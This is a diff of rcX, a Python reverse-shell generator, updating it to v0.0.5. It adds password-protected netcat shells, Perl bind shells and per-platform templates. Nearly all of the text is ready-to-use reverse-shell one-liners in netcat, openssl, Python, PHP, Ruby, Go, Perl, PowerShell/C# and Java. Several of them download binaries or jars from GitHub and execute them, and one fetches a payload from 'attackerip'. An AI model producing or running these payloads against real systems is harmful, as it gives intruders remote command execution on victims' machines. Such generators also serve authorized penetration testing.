@@ -1,16 +1,20 @@
 # coding=utf8
 __Author__ = 'FlyfishSec'
-__Version__ = 'v0.0.4'
+__Version__ = 'v0.0.5'
 __SITE__ = 'https://github.com/FlyfishSec/rcX'
 __Description__ = ''''''
 
 __Release_Notes__ = '''
 ✨ New Features
- + Add password protected bash shell
+ + Add perl bind shell
+ + Add password protected netcat shell
+
 🎨 Improvements
  + Code optimization
+ 
 🐛 Bug fixes
- + 
+ + Fix some bugs
+ 
 '''
 
 __BANNERS__ = ['''
@@ -58,8 +62,6 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
     conn_info = str(host) + ":" + str(port)
     if localtunnel:
         public_url = None
-        # ngrok_status = [p.name() for p in __import__("psutil").process_iter() if "ngrok" in p.name()]
-        # ngrok_status = [i.laddr.port for i in psutil.net_connections() if i.laddr.port == 4040]
         if "ngrok-tcp" not in [_.name for _ in __import__('threading').enumerate()]:
             # print([x.name for x in threading.enumerate()])
             t = ThreadWithReturn(target=tunnel, kwargs={"protocol": "tcp", "port": port, "loc": localtunnel[6:]},
@@ -117,7 +119,7 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
             if shell_path.lower() == "auto":
                 shell_path = "$BASH"
     else:
-        shell_path = "cmd.exe" if "windows" in platform else "bash"
+        shell_path = "cmd.exe" if ("windows" in platform and shell_type not in ["bash", "telnet", "openssl"]) or shell_type in ["powershell", "csharp"] else "bash"
 
     if isinstance(encoder, str):
         encoder = encoder.split(",") if "," in encoder else encoder.split(" ")
@@ -158,29 +160,53 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                 "nc-c": "{binary_name} {host} {port} -c {shell_path}{nc_args}",
                 "ncat": "ncat -e {shell_path} {host} {port}{ncat_args}",
                 "ncat-c": "ncat -c {shell_path} {host} {port}{ncat_args}",
-                "nc-mkfifo-linux": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell_path} -i 2>&1|{binary_name} {host} {port} >/tmp/f",
-                "nc-mknod-linux": "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|{shell_path} -i 2>&1|{binary_name} {host} {port} >/tmp/f",
+                "nc-mkfifo": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell_path} -i 2>&1|{binary_name} {host} {port} >/tmp/f",
+                "nc-mknod": "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|{shell_path} -i 2>&1|{binary_name} {host} {port} >/tmp/f",
                 "DotnetCat": "dncat -e {shell_path} {host} -p {port}"
+            },
+            "netcat-windows": {
+                "nc": "{binary_name} -e {shell_path} {host} {port}{nc_args}",
+                "nc-c": "{binary_name} {host} {port} -c {shell_path}{nc_args}",
+                "ncat": "ncat -e {shell_path} {host} {port}{ncat_args}",
+                "ncat-c": "ncat -c {shell_path} {host} {port}{ncat_args}",
+                "DotnetCat": "dncat -e {shell_path} {host} -p {port}"
+            },
+            "netcat-password": {
+                "nc-c": "nc -c 'echo -ne $RANDOM=;read k;case $k in '{password}'){shell_path} -i;esac' {host} {port}",
+                "ncat-c": "ncat -c 'echo -ne $RANDOM=;read k;case $k in '{password}'){shell_path} -i;esac' {host} {port}",
+                "nc-mkfifo": '''rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell_path} -c 'echo -ne $RANDOM=;read k;case $k in '{password}')bash -i;esac' 2>&1|{binary_name} {host} {port} >/tmp/f''',
+                "nc-mknod": '''rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|{shell_path} -c 'echo -ne $RANDOM=;read k;case $k in "{password}")bash -i;esac' 2>&1|{binary_name} {host} {port} >/tmp/f''',
             },
             "netcat-ssl": {
                 "ncat": "ncat -e {shell_path} {host} {port} --ssl",
                 "ncat-c": "ncat -c {shell_path} {host} {port} --ssl",
             },
-            "telnet": {
-                "telnet-two_ports-linux": "{binary_name} {host} {port}|{shell_path}|telnet {host} {port2}",
-                "telnet-mknod-linux": "rm -f /tmp/p;mknod /tmp/p p && {binary_name} {host} {port} 0/tmp/p",
+            "netcat-ssl-password": {
+                "ncat-c": "ncat --ssl -c 'echo -ne $RANDOM=;read k;case $k in '{password}'){shell_path} -i;esac' {host} {port}",
             },
-            "openssl": {
-                "openssl-linux": "mkfifo /tmp/s;{shell_path} -i </tmp/s 2>&1|{binary_name} s_client -quiet -connect {host}:{port}>/tmp/s;rm /tmp/s",
-                "openssl-linux-2": "mkfifo fifo; /bin/sh -i < fifo 2>&1 | openssl s_client -quiet -connect {host}:{port} > fifo; rm fifo",
+            "netcat-windows-password": {
+                "ncat-c": '''{binary_name}{ncat_args} -c "echo|set /p=%random%=&powershell $k=Read-Host;write-host $k=;if($k -eq '{password}'){{{shell_path}}}" {host} {port}''',
+            },
+            "telnet-linux": {
+                "telnet": "rm -f /tmp/p;mknod /tmp/p p && {binary_name} {host} {port} 0/tmp/p",
+                "telnet-two_ports": "{binary_name} {host} {port}|{shell_path}|telnet {host} {port2}",
+            },
+            "openssl-linux": {
+                "openssl": "mkfifo /tmp/s;{shell_path} -i </tmp/s 2>&1|{binary_name} s_client -quiet -connect {host}:{port}>/tmp/s;rm /tmp/s",
+                "openssl-2": "mkfifo fifo; /bin/sh -i < fifo 2>&1 | openssl s_client -quiet -connect {host}:{port} > fifo; rm fifo",
             },
             "python": {
                 "python": '''{binary_name} -c "import socket,threading as t,subprocess as s;c=socket.socket();c.connect(('{host}',{port}));p=s.Popen('{shell_path}',stdout=s.PIPE,stderr=s.STDOUT,stdin=s.PIPE,shell=1,universal_newlines=1);t.Thread(target=lambda:[p.stdin.flush() for _ in iter(int,1) if p.stdin.write(c.recv(1024).decode())],).start();t.Thread(target=lambda:[c.send(p.stdout.read(1).encode()) for _ in iter(int,1)],).start();p.wait()"''',
                 "python-exec": '''{binary_name} -c "exec('import os,socket,threading as t,subprocess as s\\ndef i():\\n while 1:\\n  try:\\n   p.stdin.write(c.recv(1024).decode());p.stdin.flush()\\n  except:\\n   os._exit(0)\\ndef j():\\n while 1:\\n  try:c.send(p.stdout.read(1).encode())\\n  except:pass\\nc=socket.socket()\\np=s.Popen(\\'{shell_path}\\',stdout=s.PIPE,stderr=s.STDOUT,stdin=s.PIPE,shell=1,universal_newlines=1)\\nfor _ in range(9):\\n try:\\n  c.connect((\\'{host}\\',{port}));break\\n except:\\n  pass\\nt.Thread(target=i,).start();t.Thread(target=j,).start()\\np.wait()')"''',
-                "python-pty-linux": '''{binary_name} -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{host}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('{shell_path}')"''',
-                "python-pty-short-linux": '''{binary_name} -c "a=__import__;s=a('socket');o=a('os').dup2;p=a('pty').spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(('{host}',{port}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p('{shell_path}')"''',
-                "python-subprocess1-linux": '''{binary_name} -c "socket=__import__('socket');subprocess=__import__('subprocess');os=__import__('os');s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{host}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['{shell_path}','-i'])"''',
-                "python-subprocess2-linux": '''{binary_name} -c "a=__import__;b=a('socket').socket;p=a('subprocess').call;o=a('os').dup2;s=b();s.connect(('{host}',{port}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(['{shell_path}','-i'])"''',
+                "python-pty": '''{binary_name} -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{host}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('{shell_path}')"''',
+                "python-pty-short": '''{binary_name} -c "a=__import__;s=a('socket');o=a('os').dup2;p=a('pty').spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(('{host}',{port}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p('{shell_path}')"''',
+                "python-subprocess1": '''{binary_name} -c "socket=__import__('socket');subprocess=__import__('subprocess');os=__import__('os');s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{host}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['{shell_path}','-i'])"''',
+                "python-subprocess2": '''{binary_name} -c "a=__import__;b=a('socket').socket;p=a('subprocess').call;o=a('os').dup2;s=b();s.connect(('{host}',{port}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(['{shell_path}','-i'])"''',
+                "pwncat": "pwncat -e {shell_path} {host} {port} --reconn --reconn-wait 3{pwncat_args}",
+            },
+            "python-windows": {
+                "python": '''{binary_name} -c "import socket,threading as t,subprocess as s;c=socket.socket();c.connect(('{host}',{port}));p=s.Popen('{shell_path}',stdout=s.PIPE,stderr=s.STDOUT,stdin=s.PIPE,shell=1,universal_newlines=1);t.Thread(target=lambda:[p.stdin.flush() for _ in iter(int,1) if p.stdin.write(c.recv(1024).decode())],).start();t.Thread(target=lambda:[c.send(p.stdout.read(1).encode()) for _ in iter(int,1)],).start();p.wait()"''',
+                "python-exec": '''{binary_name} -c "exec('import os,socket,threading as t,subprocess as s\\ndef i():\\n while 1:\\n  try:\\n   p.stdin.write(c.recv(1024).decode());p.stdin.flush()\\n  except:\\n   os._exit(0)\\ndef j():\\n while 1:\\n  try:c.send(p.stdout.read(1).encode())\\n  except:pass\\nc=socket.socket()\\np=s.Popen(\\'{shell_path}\\',stdout=s.PIPE,stderr=s.STDOUT,stdin=s.PIPE,shell=1,universal_newlines=1)\\nfor _ in range(9):\\n try:\\n  c.connect((\\'{host}\\',{port}));break\\n except:\\n  pass\\nt.Thread(target=i,).start();t.Thread(target=j,).start()\\np.wait()')"''',
                 "pwncat": "pwncat -e {shell_path} {host} {port} --reconn --reconn-wait 3{pwncat_args}",
             },
             "powershell": {
@@ -199,17 +225,19 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                 "csharp-powershell-code": '''$j=get-random;$d=@"\nusing System;using System.IO;using System.Net;using System.Net.Sockets;using System.Text;using System.Diagnostics;public class i$j{{public static TcpClient c;public static NetworkStream s;public static StreamReader r;public static StreamWriter w;public static StringBuilder u;public static void Main(){{c=new TcpClient();u=new StringBuilder();if(!c.Connected){{try{{c.Connect("{host}",{port});s=c.GetStream();r=new StreamReader(s,System.Text.Encoding.Default);w=new StreamWriter(s,System.Text.Encoding.Default);}}catch(Exception){{return;}}Process h;h=new Process();h.StartInfo.FileName="{shell_path}";h.StartInfo.UseShellExecute=false;h.StartInfo.RedirectStandardInput=true;h.StartInfo.RedirectStandardOutput=true;h.StartInfo.RedirectStandardError=true;h.OutputDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.ErrorDataReceived+=new DataReceivedEventHandler(SortOutputHandler);h.Start();h.BeginOutputReadLine();h.BeginErrorReadLine();while(true){{try{{u.Append(r.ReadLine());h.StandardInput.WriteLine(u);u.Remove(0,u.Length);}}catch(Exception){{r.Close();w.Close();h.Kill();break;}}}}}}}}public static void SortOutputHandler(object sendingProcess,DataReceivedEventArgs outLine){{StringBuilder strOutput=new StringBuilder();if(!String.IsNullOrEmpty(outLine.Data)){{try{{strOutput.Append(outLine.Data);w.WriteLine(strOutput);w.Flush();}}catch(Exception){{}}}}}}}}\n"@;Add-Type -TypeDefinition $d -Language CSharp;iex "[i$j]::Main()"'''
             },
             "php": {
-                "php-exec-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});exec('{shell_path} <&3 >&3 2>&3');"''',
-                "php-shell_exec-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});shell_exec('{shell_path} <&3 >&3 2>&3');"''',
-                "php-system-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});system('{shell_path} -i <&3 >&3 2>&3');"''',
-                "php-passthru-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});passthru('{shell_path} -i <&3 >&3 2>&3');"''',
-                "php-popen-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});popen('{shell_path} -i <&3 >&3 2>&3",'r');"''',
-                "php-proc_open-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});$proc=proc_open('{shell_path}',array(0=>$sock,1=>$sock,2=>$sock),$pipes);"''',
-                "php-backtick-linux": '''{binary_name} -r "$sock=fsockopen('{host}',{port});`{shell_path} <&3 >&3 2>&3`;"''',
-                "php-windows": '''echo "<?php class S{{private $addr=null;private $port=null;private $os=null;private $s=null;private $descriptorspec=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));private $buffer=1024;private $clen=0;private $error=false;public function __construct($addr,$port){{$this->addr=$addr;$this->port=$port;}}private function detect(){{$detected=true;if(stripos(PHP_OS,'LINUX')!==false){{$this->os='LINUX';$this->s='/bin/sh';}}else if(stripos(PHP_OS,'WIN32')!==false||stripos(PHP_OS,'WINNT')!==false||stripos(PHP_OS,'WINDOWS')!==false){{$this->os='WINDOWS';$this->s='cmd.exe';}}else{{$detected=false;}}return $detected;}}private function daemonize(){{$exit=false;if(!function_exists('pcntl_fork')){{}}else if(($pid=@pcntl_fork())<0){{}}else if($pid>0){{$exit=true;}}else if(posix_setsid()<0){{}}else{{}}return $exit;}}private function settings(){{@error_reporting(0);@set_time_limit(0);@umask(0);}}private function dump($data){{$data=str_replace('<','&lt;',$data);$data=str_replace('>','&gt;',$data);}}private function read($stream,$name,$buffer){{if(($data=@fread($stream,$buffer))===false){{$this->error=true;}}return $data;}}private function write($stream,$name,$data){{if(($bytes=@fwrite($stream,$data))===false){{$this->error=true;}}return $bytes;}}private function rw($input,$output,$iname,$oname){{while(($data=$this->read($input,$iname,$this->buffer))&&$this->write($output,$oname,$data)){{if($this->os==='WINDOWS'&&$oname==='STDIN'){{$this->clen+=strlen($data);}}$this->dump($data);}}}}private function brw($input,$output,$iname,$oname){{$fstat=fstat($input);$size=$fstat['size'];if($this->os==='WINDOWS'&&$iname==='STDOUT'&&$this->clen){{while($this->clen>0&&($bytes=$this->clen>=$this->buffer?$this->buffer:$this->clen)&&$this->read($input,$iname,$bytes)){{$this->clen-=$bytes;$size-=$bytes;}}}}while($size>0&&($bytes=$size>=$this->buffer?$this->buffer:$size)&&($data=$this->read($input,$iname,$bytes))&&$this->write($output,$oname,$data)){{$size-=$bytes;$this->dump($data);}}}}public function run(){{if($this->detect()&&!$this->daemonize()){{$this->settings();$socket=@fsockopen($this->addr,$this->port,$errno,$errstr,30);if(!$socket){{echo"{{$errno}}: {{$errstr}}";}}else{{stream_set_blocking($socket,false);$process=@proc_open($this->s,$this->descriptorspec,$pipes,null,null);if(!$process){{}}else{{foreach($pipes as $pipe){{stream_set_blocking($pipe,false);}}$status=proc_get_status($process);@fwrite($socket,"PID:{{$status['pid']}}");do{{$status=proc_get_status($process);if(feof($socket)){{break;}}else if(feof($pipes[1])||!$status['running']){{break;}}$streams=array('read'=>array($socket,$pipes[1],$pipes[2]),'write'=>null,'except'=>null);$num_changed_streams=@stream_select($streams['read'],$streams['write'],$streams['except'],0);if($num_changed_streams===false){{break;}}else if($num_changed_streams>0){{if($this->os==='LINUX'){{if(in_array($socket,$streams['read'])){{$this->rw($socket,$pipes[0],'SOCKET','STDIN');}}if(in_array($pipes[2],$streams['read'])){{$this->rw($pipes[2],$socket,'STDERR','SOCKET');}}if(in_array($pipes[1],$streams['read'])){{$this->rw($pipes[1],$socket,'STDOUT','SOCKET');}}}}else if($this->os==='WINDOWS'){{if(in_array($socket,$streams['read'])){{$this->rw($socket,$pipes[0],'SOCKET','STDIN');}}if(($fstat=fstat($pipes[2]))&&$fstat['size']){{$this->brw($pipes[2],$socket,'STDERR','SOCKET');}}if(($fstat=fstat($pipes[1]))&&$fstat['size']){{$this->brw($pipes[1],$socket,'STDOUT','SOCKET');}}}}}}}}while(!$this->error);foreach($pipes as $pipe){{fclose($pipe);}}proc_close($process);}}fclose($socket);}}}}}}}}$sh=new S('{host}',{port});$sh->run();unset($sh);?>"|{binary_name}''',
+                "php-exec": '''{binary_name} -r "$sock=fsockopen('{host}',{port});exec('{shell_path} <&3 >&3 2>&3');"''',
+                "php-shell_exec": '''{binary_name} -r "$sock=fsockopen('{host}',{port});shell_exec('{shell_path} <&3 >&3 2>&3');"''',
+                "php-system": '''{binary_name} -r "$sock=fsockopen('{host}',{port});system('{shell_path} -i <&3 >&3 2>&3');"''',
+                "php-passthru": '''{binary_name} -r "$sock=fsockopen('{host}',{port});passthru('{shell_path} -i <&3 >&3 2>&3');"''',
+                "php-popen": '''{binary_name} -r "$sock=fsockopen('{host}',{port});popen('{shell_path} -i <&3 >&3 2>&3",'r');"''',
+                "php-proc_open": '''{binary_name} -r "$sock=fsockopen('{host}',{port});$proc=proc_open('{shell_path}',array(0=>$sock,1=>$sock,2=>$sock),$pipes);"''',
+                "php-backtick": '''{binary_name} -r "$sock=fsockopen('{host}',{port});`{shell_path} <&3 >&3 2>&3`;"''',
                 "php-code": '''<?php class S{{private $addr=null;private $port=null;private $os=null;private $s=null;private $descriptorspec=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));private $buffer=1024;private $clen=0;private $error=false;public function __construct($addr,$port){{$this->addr=$addr;$this->port=$port;}}private function detect(){{$detected=true;if(stripos(PHP_OS,'LINUX')!==false){{$this->os='LINUX';$this->s='/bin/sh';}}else if(stripos(PHP_OS,'WIN32')!==false||stripos(PHP_OS,'WINNT')!==false||stripos(PHP_OS,'WINDOWS')!==false){{$this->os='WINDOWS';$this->s='cmd.exe';}}else{{$detected=false;}}return $detected;}}private function daemonize(){{$exit=false;if(!function_exists('pcntl_fork')){{}}else if(($pid=@pcntl_fork())<0){{}}else if($pid>0){{$exit=true;}}else if(posix_setsid()<0){{}}else{{}}return $exit;}}private function settings(){{@error_reporting(0);@set_time_limit(0);@umask(0);}}private function dump($data){{$data=str_replace('<','&lt;',$data);$data=str_replace('>','&gt;',$data);}}private function read($stream,$name,$buffer){{if(($data=@fread($stream,$buffer))===false){{$this->error=true;}}return $data;}}private function write($stream,$name,$data){{if(($bytes=@fwrite($stream,$data))===false){{$this->error=true;}}return $bytes;}}private function rw($input,$output,$iname,$oname){{while(($data=$this->read($input,$iname,$this->buffer))&&$this->write($output,$oname,$data)){{if($this->os==='WINDOWS'&&$oname==='STDIN'){{$this->clen+=strlen($data);}}$this->dump($data);}}}}private function brw($input,$output,$iname,$oname){{$fstat=fstat($input);$size=$fstat['size'];if($this->os==='WINDOWS'&&$iname==='STDOUT'&&$this->clen){{while($this->clen>0&&($bytes=$this->clen>=$this->buffer?$this->buffer:$this->clen)&&$this->read($input,$iname,$bytes)){{$this->clen-=$bytes;$size-=$bytes;}}}}while($size>0&&($bytes=$size>=$this->buffer?$this->buffer:$size)&&($data=$this->read($input,$iname,$bytes))&&$this->write($output,$oname,$data)){{$size-=$bytes;$this->dump($data);}}}}public function run(){{if($this->detect()&&!$this->daemonize()){{$this->settings();$socket=@fsockopen($this->addr,$this->port,$errno,$errstr,30);if(!$socket){{echo"{{$errno}}: {{$errstr}}";}}else{{stream_set_blocking($socket,false);$process=@proc_open($this->s,$this->descriptorspec,$pipes,null,null);if(!$process){{}}else{{foreach($pipes as $pipe){{stream_set_blocking($pipe,false);}}$status=proc_get_status($process);@fwrite($socket,"PID:{{$status['pid']}}");do{{$status=proc_get_status($process);if(feof($socket)){{break;}}else if(feof($pipes[1])||!$status['running']){{break;}}$streams=array('read'=>array($socket,$pipes[1],$pipes[2]),'write'=>null,'except'=>null);$num_changed_streams=@stream_select($streams['read'],$streams['write'],$streams['except'],0);if($num_changed_streams===false){{break;}}else if($num_changed_streams>0){{if($this->os==='LINUX'){{if(in_array($socket,$streams['read'])){{$this->rw($socket,$pipes[0],'SOCKET','STDIN');}}if(in_array($pipes[2],$streams['read'])){{$this->rw($pipes[2],$socket,'STDERR','SOCKET');}}if(in_array($pipes[1],$streams['read'])){{$this->rw($pipes[1],$socket,'STDOUT','SOCKET');}}}}else if($this->os==='WINDOWS'){{if(in_array($socket,$streams['read'])){{$this->rw($socket,$pipes[0],'SOCKET','STDIN');}}if(($fstat=fstat($pipes[2]))&&$fstat['size']){{$this->brw($pipes[2],$socket,'STDERR','SOCKET');}}if(($fstat=fstat($pipes[1]))&&$fstat['size']){{$this->brw($pipes[1],$socket,'STDOUT','SOCKET');}}}}}}}}while(!$this->error);foreach($pipes as $pipe){{fclose($pipe);}}proc_close($process);}}fclose($socket);}}}}}}}}$sh=new S('{host}',{port});$sh->run();unset($sh);?>''',
             },
-            "ruby": {
+            "php-windows": {
+                "php": '''echo "<?php class S{{private $addr=null;private $port=null;private $os=null;private $s=null;private $descriptorspec=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));private $buffer=1024;private $clen=0;private $error=false;public function __construct($addr,$port){{$this->addr=$addr;$this->port=$port;}}private function detect(){{$detected=true;if(stripos(PHP_OS,'LINUX')!==false){{$this->os='LINUX';$this->s='/bin/sh';}}else if(stripos(PHP_OS,'WIN32')!==false||stripos(PHP_OS,'WINNT')!==false||stripos(PHP_OS,'WINDOWS')!==false){{$this->os='WINDOWS';$this->s='cmd.exe';}}else{{$detected=false;}}return $detected;}}private function daemonize(){{$exit=false;if(!function_exists('pcntl_fork')){{}}else if(($pid=@pcntl_fork())<0){{}}else if($pid>0){{$exit=true;}}else if(posix_setsid()<0){{}}else{{}}return $exit;}}private function settings(){{@error_reporting(0);@set_time_limit(0);@umask(0);}}private function dump($data){{$data=str_replace('<','&lt;',$data);$data=str_replace('>','&gt;',$data);}}private function read($stream,$name,$buffer){{if(($data=@fread($stream,$buffer))===false){{$this->error=true;}}return $data;}}private function write($stream,$name,$data){{if(($bytes=@fwrite($stream,$data))===false){{$this->error=true;}}return $bytes;}}private function rw($input,$output,$iname,$oname){{while(($data=$this->read($input,$iname,$this->buffer))&&$this->write($output,$oname,$data)){{if($this->os==='WINDOWS'&&$oname==='STDIN'){{$this->clen+=strlen($data);}}$this->dump($data);}}}}private function brw($input,$output,$iname,$oname){{$fstat=fstat($input);$size=$fstat['size'];if($this->os==='WINDOWS'&&$iname==='STDOUT'&&$this->clen){{while($this->clen>0&&($bytes=$this->clen>=$this->buffer?$this->buffer:$this->clen)&&$this->read($input,$iname,$bytes)){{$this->clen-=$bytes;$size-=$bytes;}}}}while($size>0&&($bytes=$size>=$this->buffer?$this->buffer:$size)&&($data=$this->read($input,$iname,$bytes))&&$this->write($output,$oname,$data)){{$size-=$bytes;$this->dump($data);}}}}public function run(){{if($this->detect()&&!$this->daemonize()){{$this->settings();$socket=@fsockopen($this->addr,$this->port,$errno,$errstr,30);if(!$socket){{echo"{{$errno}}: {{$errstr}}";}}else{{stream_set_blocking($socket,false);$process=@proc_open($this->s,$this->descriptorspec,$pipes,null,null);if(!$process){{}}else{{foreach($pipes as $pipe){{stream_set_blocking($pipe,false);}}$status=proc_get_status($process);@fwrite($socket,"PID:{{$status['pid']}}");do{{$status=proc_get_status($process);if(feof($socket)){{break;}}else if(feof($pipes[1])||!$status['running']){{break;}}$streams=array('read'=>array($socket,$pipes[1],$pipes[2]),'write'=>null,'except'=>null);$num_changed_streams=@stream_select($streams['read'],$streams['write'],$streams['except'],0);if($num_changed_streams===false){{break;}}else if($num_changed_streams>0){{if($this->os==='LINUX'){{if(in_array($socket,$streams['read'])){{$this->rw($socket,$pipes[0],'SOCKET','STDIN');}}if(in_array($pipes[2],$streams['read'])){{$this->rw($pipes[2],$socket,'STDERR','SOCKET');}}if(in_array($pipes[1],$streams['read'])){{$this->rw($pipes[1],$socket,'STDOUT','SOCKET');}}}}else if($this->os==='WINDOWS'){{if(in_array($socket,$streams['read'])){{$this->rw($socket,$pipes[0],'SOCKET','STDIN');}}if(($fstat=fstat($pipes[2]))&&$fstat['size']){{$this->brw($pipes[2],$socket,'STDERR','SOCKET');}}if(($fstat=fstat($pipes[1]))&&$fstat['size']){{$this->brw($pipes[1],$socket,'STDOUT','SOCKET');}}}}}}}}while(!$this->error);foreach($pipes as $pipe){{fclose($pipe);}}proc_close($process);}}fclose($socket);}}}}}}}}$sh=new S('{host}',{port});$sh->run();unset($sh);?>"|{binary_name}''',
+            },
+            "ruby-linux": {
                 "ruby-spawn": '''{binary_name} -rsocket -e"spawn('{shell_path}',[:in,:out,:err]=>TCPSocket.new('{host}',{port}))"''',
                 "ruby-sprintf": '''{binary_name} -rsocket -e"f=TCPSocket.open('{host}',{port}).to_i;exec sprintf('{shell_path} -i <&%d >&%d 2>&%d',f,f,f)"''',
                 "ruby-new": '''{binary_name} -rsocket -e "exit if fork;c=TCPSocket.new('{host}',{port});loop{{c.gets.chomp!;(exit! if $_=='exit');($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts 'failed: #{{$_}}'}}"''',
@@ -220,20 +248,23 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                 "socat-tty": "{binary_name} {protocol}:{host}:{port} EXEC:'{shell_path}',pty,stderr,setsid,sigint,sane",
                 "socat-linux": '''wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat exec:'{shell_path} -li',pty,stderr,setsid,sigint,sane {protocol}:{host}:{port}''',
             },
-            "golang": {
-                "golang-linux": '''echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{host}:{port}");cmd:=exec.Command("{shell_path}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'>/tmp/t.go &&{binary_name} run /tmp/t.go&&rm /tmp/t.go''',
-                "golang-windows": '''echo package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{host}:{port}");cmd:=exec.Command("{shell_path}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}>%tmp%\\0.go&{binary_name} run %tmp%\\0.go&del %tmp%\\0.go %tmp%\\0''',
-                # "rustcat": "rcat {host} {port} -r {shell_path}{rcat_args}",
+            "golang-linux": {
+                "golang": '''echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{host}:{port}");cmd:=exec.Command("{shell_path}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'>/tmp/t.go &&{binary_name} run /tmp/t.go&&rm /tmp/t.go''',
             },
-            "perl": {
-                "perl": '''{binary_name} -e "use Socket;$i='{host}';$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('{shell_path} -i');}};"''',
-                "perl-2": '''{binary_name} -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,'{host}:{port}');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"''',
-                "perl-windows": '''{binary_name} -MIO -e "$c=new IO::Socket::INET(PeerAddr,'{host}:{port}');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"''',
-                # "rustcat": "rcat {host} {port} -r {shell_path}{rcat_args}",
+            "golang-windows": {
+                "golang": '''echo package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{host}:{port}");cmd:=exec.Command("{shell_path}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}>%tmp%\\0.go&{binary_name} run %tmp%\\0.go&del %tmp%\\0.go %tmp%\\0''',
+            },
+            "perl-linux": {
+                "perl": """{binary_name} -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("{protocol}"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell_path} -i");}};'""",
+                "perl-2": """{binary_name} -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{host}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""",
+            },
+            "perl-windows": {
+                'perl': '''{binary_name} -e "use Socket;$i='{host}';$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('{protocol}'));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('{shell_path}');}};"''',
+                'perl-2': '''{binary_name} -MIO -e "$c=new IO::Socket::INET(PeerAddr,'{host}:{port}');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"''',
             },
             "java": {
                 "java-jar": "{binary_name} -jar Reverse_Shell.jar {host} {port}",
-                "java-jar2": "wget -q https://raw.githubusercontent.com/ivan-sincek/java-reverse-tcp/main/jar/Reverse_Shell.jar -O 0&&java -jar 0 {host} {port}&&del 0||rm 0",
+                "java-jar-github": "wget -q https://raw.githubusercontent.com/ivan-sincek/java-reverse-tcp/main/jar/Reverse_Shell.jar -O 0&&java -jar 0 {host} {port}&&del 0||rm 0",
                 "java-jar3": "{binary_name} -jar JavaStager-0.1-initial.jar http://attackerip/payload.java",
                 "java-jsp": "https://github.com/tennc/webshell/blob/master/jsp/jsp-reverse.jsp",
                 "java-jsp2": "https://github.com/ivan-sincek/java-reverse-tcp/blob/main/jsp/reverse/jsp_reverse_shell.jsp",
@@ -241,7 +272,12 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                 "java-war-msfvenom": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={host} LPORT={port} -f war>reverse.war"
